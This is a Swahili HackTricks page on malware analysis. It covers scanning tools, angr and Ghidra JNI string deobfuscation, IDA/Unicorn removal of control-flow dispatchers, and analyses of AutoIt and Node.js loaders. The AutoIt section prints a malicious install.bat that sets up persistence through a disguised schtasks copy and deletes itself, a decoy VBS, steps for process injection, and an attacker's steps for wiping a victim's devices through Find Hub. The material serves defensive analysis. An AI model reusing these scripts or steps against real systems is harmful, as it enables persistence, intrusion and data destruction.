# Uchambuzi wa Malware

{{#include ../../banners/hacktricks-training.md}}

## CheatSheets za Forensics

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Huduma za Mtandaoni

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Zana za Antivirus na Ugunduzi zisizo mtandaoni

### Yara

#### Sakinisha
```bash
sudo apt-get install -y yara
```
#### Kuandaa sheria

Tumia skiripti hii kupakua na kuunganisha yote yara malware rules kutoka github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Unda saraka _**rules**_ kisha utekeleze skiripti. Hii itaunda faili inayoitwa _**malware_rules.yar**_ ambayo ina yara rules zote za malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Tambaza
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Angalia malware na tengeneza yara rules

Unaweza kutumia zana [**YaraGen**](https://github.com/Neo23x0/yarGen) kutengeneza yara rules kutoka kwa binary. Angalia mafunzo haya: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Sakinisha
```
sudo apt-get install -y clamav
```
#### Scan
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** inagundua **capabilities** zinazoweza kuwa hatari katika executables: PE, ELF, .NET. Hivyo itapata vitu kama Att\&ck tactics, au capabilities zenye kutiliwa shaka kama:

- angalia kosa la OutputDebugString
- run as a service
- create process

Inapatikana kwenye [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC inamaanisha Indicator Of Compromise. IOC ni seti ya **vigezo vinavyoitambulisha** baadhi ya software ambayo inaweza kuwa haitakiwa au **malware** iliyothibitishwa. Blue Teams hutumia aina hii ya ufafanuzi **kutafuta aina hii ya faili hatari** katika **mifumo** na **mitandao** zao.\
Kushirikisha ufafanuzi hizi ni muhimu — wakati malware inapotambuliwa kwenye kompyuta na IOC ya malware hiyo inapotengenezwa, Blue Teams wengine wanaweza kuitumia kutambua malware haraka zaidi.

Chombo cha kuunda au kubadilisha IOCs ni [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Unaweza kutumia zana kama [**Redline**](https://www.fireeye.com/services/freeware/redline.html) kutafuta **IOCs zilizofafanuliwa kwenye kifaa**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) ni scanner kwa Simple Indicators of Compromise.\
Ugunduzi unategemea mbinu nne za kugundua:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) ni malware scanner kwa Linux iliyotolewa chini ya leseni ya GNU GPLv2, iliyobuniwa kuzingatia vitisho vinavyokumbana katika mazingira ya mwenyeji ya pamoja. Inatumia data za vitisho kutoka kwa network edge intrusion detection systems kunasa malware zinazotumika kwa sasa katika mashambulizi na kuunda signatures kwa ajili ya utambuzi. Zaidi ya hayo, data za vitisho pia hupatikana kutokana na mawasilisho ya watumiaji kupitia kipengele cha LMD checkout na rasilimali za malware community.

### rkhunter

Zana kama [**rkhunter**](http://rkhunter.sourceforge.net) zinaweza kutumika kukagua filesystem kwa ajili ya **rootkits** na malware zinazowezekana.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) ni zana itakayojaribu kutafuta strings zilizofichwa ndani ya executables kwa kutumia mbinu mbalimbali.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) huchunguza baadhi ya vitu vya msingi ndani ya executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) ni zana inayoruhusu kupata taarifa za Windows executables kama imports, exports, headers, lakini pia itachunguza virus total na kugundua Att\&ck techniques zinazowezekana.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) ni zana ya kugundua kama faili ime **encrypted** na pia kupata **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) ni script ya Python inayotumia aina mbalimbali za **statistical methods** kugundua yaliyomo **obfuscated** na **encrypted** ndani ya faili za text/script. Kusudi la NeoPI ni kusaidia katika **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) hujaribu kwa kadiri inawezavyo kugundua **obfuscated**/**dodgy code** pamoja na faili zinazotumia **PHP** functions zinazotumika mara nyingi katika **malwares**/webshells.

### Apple Binary Signatures

Wakati wa kukagua baadhi ya **malware sample** unapaswa kila mara **check the signature** ya binary kwani **developer** aliyesaini anaweza tayari kuwa **related** na **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Mbinu za Ugundaji

### File Stacking

Ikiwa unajua kwamba folda fulani yenye **files** za **web server** ilibadilishwa mwisho tarehe fulani, **angalia** tarehe ambazo **files** zote kwenye **web server** ziliundwa na kubadilishwa; ikiwa tarehe yoyote inaonekana **inayoshukiwa**, chunguza file hiyo.

### Baselines

Ikiwa **files** za folder hazikustahili kubadilishwa, unaweza kuhesabu **hash** ya **original files** za folder na kuzilinganisha na zile **current**. Kitu chochote kilichobadilishwa kitakuwa **inayoshukiwa**.

### Statistical Analysis

Wakati taarifa zimehifadhiwa katika logs unaweza **kuangalia takwimu** kama ni mara ngapi kila **file** ya **web server** ilifikiwa, kwa kuwa web shell inaweza kuwa miongoni mwa ambazo zinatumika zaidi.

---

### Android in-app native telemetry (no root)

Kwenye Android, unaweza ku-instrument native code ndani ya process ya target app kwa ku-preload maktaba ndogo ya logger kabla libs nyingine za JNI hazijaanzishwa. Hii inatoa uonekano wa mapema wa tabia ya native bila hooks za mfumo mzima au root. Mbinu maarufu ni SoTap: weka libsotap.so kwa ABI sahihi ndani ya APK na weka mwito wa System.loadLibrary("sotap") mapema (mfano, static initializer au Application.onCreate), kisha ukusanye logs kutoka njia za internal/external au Logcat kama fallback.

Angalia ukurasa wa Android native reversing kwa maelezo ya setup na njia za log:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Baadhi ya malware ya Android na apps zilizo na ulinzi wa RASP zinaficha majina ya method za JNI na signatures kwa kuzitoa kwa decoding wakati wa runtime kabla ya kuita RegisterNatives. Wakati instrumentation ya Frida/ptrace inakatizwa na anti-debug, bado unaweza kurejesha plaintext offline kwa kuendesha decoder iliyopo ndani ya binary kwa kutumia angr kisha kusukuma matokeo nyuma ndani ya Ghidra kama maoni.

Idea kuu: chukulia decoder ndani ya .so kama function inayoweza kuitwa, iiendeshe kwenye blob za byte zilizoobfuscate zilizoko katika .rodata, na kubainisha byte za output hadi \x00 ya kwanza (C-string terminator). Hakikisha angr na Ghidra zinatumia image base ile ile ili kuepuka kutofanana kwa anwani.

Muhtasari wa workflow
- Triage in Ghidra: tambua decoder na calling convention/vigezo vyake katika JNI_OnLoad na usanidi wa RegisterNatives.
- Run angr (CPython3) ili kuendesha decoder kwa kila string lengwa na dump matokeo.
- Annotate in Ghidra: weka maoni ya moja kwa moja kwa strings zilizodetuliwa katika kila call site ili kujenga upya JNI kwa haraka.

Ghidra triage (JNI_OnLoad pattern)
- Tumia JNI datatypes kwa JNI_OnLoad ili Ghidra itambue JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Tafuta miito kwa RegisterNatives. Ikiwa library inajenga name/signature kwa rutina ya ndani (e.g., FUN_00100e10) inayorejea kwenye static byte table (e.g., DAT_00100bf4) na inachukua vigezo kama (encoded_ptr, out_buf, length), hiyo ni lengo zuri kwa utekelezaji offline.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>angr setup and offline decoder execution</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Kwa kiwango kikubwa, jenga ramani isiyobadilika ya call sites kuelekea kwa vigezo vya decoder (encoded_ptr, size). Wrappers zinaweza kuficha vigezo, hivyo unaweza kuunda ramani hii kwa mkono kutoka Ghidra xrefs ikiwa API recovery ni noisy.

<details>
<summary>Batch decode multiple call sites with angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ongeza maelezo kwa call sites ndani ya Ghidra
Chaguo A: Mwandishi wa maoni kwa Jython pekee (tumia JSON iliyotayarishwa kabla)
- Kwa kuwa angr inahitaji CPython3, weka deobfuscation na annotation zikitengwa. Kwanza endesha angr script iliyo juu ili kutoa decoded_strings.json. Kisha endesha GhidraScript hii ya Jython ili kuandika PRE_COMMENTs kwenye kila call site (na jumuisha jina la function inayoitisha kwa muktadha):

<details>
<summary>Script ya Ghidra (Jython) ya kuandika maoni kwa decoded JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Chaguo B: Script moja ya CPython kupitia pyhidra/ghidra_bridge
- Mbali na hayo, tumia pyhidra au ghidra_bridge kuendesha API ya Ghidra kutoka kwenye mchakato mmoja wa CPython unaoendesha angr. Hii inaruhusu kuita decode_string() na kuweka PRE_COMMENTs papo hapo bila faili la kati. Mantiki inafanana na script ya Jython: jenga ramani ya callsite→function kupitia ReferenceManager, decode kwa angr, na weka maoni.

Kwa nini hii inafanya kazi na lini kutumia
- Utekelezaji wa offline unaepuka RASP/anti-debug: hakuna ptrace, hakuna Frida hooks zinazohitajika ili kupata strings.
- Kuweka Ghidra na angr base_addr zikiendana (mfano, 0x00100000) huhakikisha kuwa anwani za function/data zinaendana kati ya zana.
- Recipe inayorudiwa kwa decoders: chukulia transform kama pure function, taja output buffer katika state safi, iite na (encoded_ptr, out_ptr, len), kisha concretize kupitia state.solver.eval na parse C-strings hadi \x00.

Vidokezo na vumbi la mtego
- Heshimu target ABI/calling convention. angr.factory.callable huchagua moja kulingana na arch; ikiwa arguments zinaonekana zimepandishwa, taja cc waziwazi.
- Ikiwa decoder inatarajia output buffers zilizo zero, anzisha outbuf kwa zeros katika state kabla ya call.
- Kwa position-independent Android .so, daima toa base_addr ili anwani katika angr ziendane na zile zinazoonekana katika Ghidra.
- Tumia currentProgram.getReferenceManager() kuorodhesha call-xrefs hata kama app imefungia decoder nyuma ya thin stubs.

Kwa mambo ya msingi ya angr, tazama: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Kuondoa ufichaji wa Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Familia za malware za kisasa zinatumia kupita kiasi Control-Flow Graph (CFG) obfuscation: badala ya jump/call ya moja kwa moja wanahesabu marudio wakati wa kukimbia na kutekeleza `jmp rax` au `call rax`. Dispatcher mdogo wa *dispatcher* (kawaida maagizo tisa) huweka lengo la mwisho kulingana na flags za CPU `ZF`/`CF`, na kuvunja kabisa urejeshaji wa static CFG.

Mbinu hii — iliyoonyeshwa na loader ya SLOW#TEMPEST — inaweza kushindwa kwa mtiririko wa hatua tatu unaotegemea tu IDAPython na Unicorn CPU emulator.

### 1. Locate every indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Toa dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Iga mara mbili kwa kutumia Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Endesha `run(code,0,0)` na `run(code,1,1)` ili kupata malengo ya matawi *false* na *true*.

### 4. Patch back a direct jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Baada ya patching, walazimishe IDA ichanganue upya function ili CFG kamili na Hex-Rays output virejeshwe:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Weka lebo kwa indirect API calls

Mara tu mwelekeo halisi wa kila `call rax` unapojulikana, unaweza kumwambia IDA ni nini ili parameter types & variable names zipatikane kiotomatiki:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Manufaa ya vitendo

* Inarudisha CFG halisi → decompilation inakua kutoka *10* mistari hadi maelfu.
* Inawawezesha string-cross-reference & xrefs, na kuifanya urejesho wa tabia kuwa rahisi sana.
* Scripts zinaweza kutumika tena: ziweke ndani ya loader yoyote iliyolindwa na ujanja ule ule.

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade na RAT injection

Mfumo huu wa uvamizi unaunganisha MSI iliyosainiwa, AutoIt loaders zilizotengenezwa kuwa .a3x, na kazi ya Task Scheduler inayojifanya kuwa app isiyo hatari.

### MSI → custom actions → AutoIt orchestrator

Mti wa michakato na amri zinazotekelezwa na custom actions za MSI:

- MsiExec.exe → cmd.exe kuendesha install.bat
- WScript.exe kuonyesha dirisha la kosa la kudanganya
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (inaweka loader, inaweka persistence, inajisafisha):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (mtego wa mtumiaji):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Vifaa muhimu na kujifanya:
- Drops AutoIt3.exe and IoKlTr.au3 to C:\Users\Public\Music
- Copies schtasks.exe to hwpviewer.exe (masquerades as Hangul Word Processor viewer)
- Creates a scheduled task "IoKlTr" that runs every 1 minute
- Startup LNK seen as Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Stages modules under %APPDATA%\Google\Browser\ subfolders containing `adb` or `adv` and starts them via autoit.vbs/install.bat helpers

Vidokezo vya triage ya forensiki:
- Uorodheshaji wa schtasks: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Tazama nakala zilizobadilishwa majina za schtasks.exe zilizo karibu na Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Njia za kawaida: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Fananisha uundaji wa mchakato: AutoIt3.exe ikizaa Windows binaries halali (mfano: cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt modules are compiled with `#AutoIt3Wrapper_Outfile_type=a3x` and decrypt embedded payloads before injecting into benign processes.
- Observed families: QuasarRAT (injected into hncfinder.exe) and RftRAT/RFTServer (injected into cleanmgr.exe), as well as RemcosRAT modules (`Remcos\RunBinary.a3x`).
- Decryption pattern: derive an AES key via HMAC, decrypt the embedded blob, then inject the plaintext module.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) ya target host (mf., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory na module/shellcode iliyofumbuliwa
- CreateRemoteThread au QueueUserAPC kuitekeleza payload

Hunting ideas
- AutoIt3.exe ikiwa mwana wa MsiExec.exe au WScript.exe, ikianzisha system utilities
- Faili zenye `.a3x` extensions au AutoIt script runners chini ya public/user-writable paths
- Suspicious scheduled tasks zinazoendesha AutoIt3.exe au binaries zisizotiwa sahihi na Microsoft, zenye minute-level triggers

### Account-takeover abuse of Android Find My Device (Find Hub)

Wakati wa uvamizi wa Windows, operator walitumia credentials za Google zilizoibwa kufuta mara kwa mara vifaa vya Android vya mwathiri, wakizima arifa wakati walipanua ufikiaji kupitia desktop messenger ya mwathiri aliyekuwa ameingia.

Operator steps (kutoka katika session ya browser iliyojiingia):
- Kagua Google Account → Security → Your devices; fuata Find My Phone → Find Hub (https://www.google.com/android/find)
- Chagua device → ingiza tena password ya Google → tekeleza "Erase device" (factory reset); rudia ili kuchelewesha urejeshaji
- Hiari: futa barua za onyo katika mailbox iliyounganishwa (mf., Naver) ili kuficha arifa za usalama

## Tracing heavily obfuscated Node.js loaders

Wavunjaji mara kwa mara hujumlisha JavaScript loaders ndani ya standalone Windows binaries zilizojengwa na [`nexe`](https://github.com/nexe/nexe), hivyo runtime huletwa pamoja na script. PE inayotokana mara nyingi huwa na uzito wa 60–90 MB na inatekeleza hata kama Node.js haijawekwa. Wakati wa triage:

- Tumia [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) kutoa JavaScript iliyojengwa ndani ya PE na kuipeleka kwa tooling ya eneo kwa ajili ya static diffing.
- Tarajia mutex inayotegemea disk katika `%TEMP%` (GachiLoader hutoa faili isiyopangwa `<name>.lock` ambayo inaisha baada ya takriban ~5 dakika). Kunakili faili hiyo kwenda sandbox kabla ya utekelezaji kunakuwezesha kuruka hatua za kurudiana huku ukibaki ukaona payloads za baadaye.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) inaweka hooks kwenye core modules ndani ya mchakato wowote wa Node.js, inakuruhusu kuiga anti-VM probes, na inahifadhi kila artifact ambayo sampuli inaandika. Anzisha scripts zilizofichwa kupitia tracer ili kuweka instrumentation inayodhibitiwa na mchambuzi kwenye call stack:
```powershell
node -r .\tracer.js main.js
```
Mbadala muhimu za usanidi ndani ya `tracer.js` zinakuwezesha:

- Kuregista shughuli za filesystem, child-process, na HTTP (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Kila faili iliyodanganywa—kama `kidkadi.node`—inakopiwa kwenye saraka ya kazi kabla malware kuifuta.
- Kufuta alama za mazingira kwa kurudisha hesabu halisi za RAM/CPU, kuiga matokeo ya `tasklist`, na kuharibu majibu ya PowerShell/WMI. Hii inapita loaders zinazodai ≥4 GB RAM, ≥2 cores, na kuchunguza majina ya watumiaji (`mashinesssss`, `wdagutilityaccount`, n.k.), hostnames (`desktop-vrsqlag`, `server1` …), na majina ya mchakato (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Kuondoa uangalizi wa WMI kwa vifaa kama `Get-WmiObject Win32_DiskDrive` (kutafuta `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (kuzuia “VirtualBox Graphics Adapter”, “Hyper-V Video”, n.k.) na kuhesabu `Win32_PortConnector`. Wakati probe hizo zinaporipoti vifaa “halisi”, sandboxes hazitapitia tena mzunguko usio na mwisho wa simu za `Invoke-WebRequest` zenye nia njema kwenda `linkedin.com`, `grok.com`, `whatsapp.com`, na vikoa vinavyofanana ambavyo GachiLoader inatumia kupoteza muda wa uchambuzi.

### Kukamata trafiki ya C2 iliyodhibitiwa kiotomatiki

Hook za mtandao za tracer zinafunua uthibitishaji wa ngazi nyingi wa C2 bila kuureverse JavaScript obfuscation. Katika kampeni iliyoshuhudiwa loader:

1. Inatuma telemetry ya host kwa `/log` kwenye kila C2 iliyo hard-coded.
2. Inafanya `GET /richfamily/<per-sample key>` na `X-Secret: gachifamily` ili kupata URL ya payload iliyokodishwa kwa Base64.
3. Inafanya `GET` ya mwisho kwa URL hiyo ikitumia header ndefu ya `X-Secret` ya kila sampuli; ukikosa inarudisha `403 Forbidden`.

Kwa sababu tracer inarekodi maombi kamili (headers, bodies, destinations), unaweza kureplay trafiki ile ile ili kuvuta payloads, ku-dump Themida/VMProtect shells kwenye kumbukumbu, na kutoa data ya usanidi ya Rhadamanthys kwa wingi.

## AdaptixC2: Configuration Extraction and TTPs

Ona ukurasa maalum:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
